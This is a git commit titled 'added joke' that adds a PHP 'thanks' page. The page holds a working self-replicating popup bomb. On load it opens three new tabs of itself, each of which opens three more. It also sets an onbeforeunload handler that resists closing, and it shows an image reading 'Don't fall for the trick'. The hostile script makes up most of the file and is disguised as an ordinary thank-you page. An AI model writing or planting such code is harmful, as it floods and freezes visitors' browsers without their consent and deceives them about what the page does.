781748921282e3ebbafe024fd04aa60ad9d176cf
George Ogden <George-Ogden@outlook.com>
2022-05-14 18:58:27 +0100

    added joke

---
+++ thanks.php
@@ -0,0 +1,15 @@
+<img style="width:100%" src=https://cdn1.byjus.com/wp-content/uploads/2018/11/free-ias-prep/2016/12/27073227/Don%E2%80%99t-fall-for-the-trick-1024x554.jpg>
+<script>
+window.onbeforeunload = () => "Error closing page";
+const delay=t=>new Promise(i=>setTimeout(i,t))
+window.onload = async function(){
+    const main = Object.fromEntries(new URLSearchParams(window.location.search)).w === undefined;
+    await delay(1e2)
+    if (main){
+        await delay(2e3)
+    }
+    for (let i = 0; i < 3; i++){
+        window.open(`${window.location.origin}${window.location.pathname}?w=0`, '_blank');
+    }
+}
+</script>
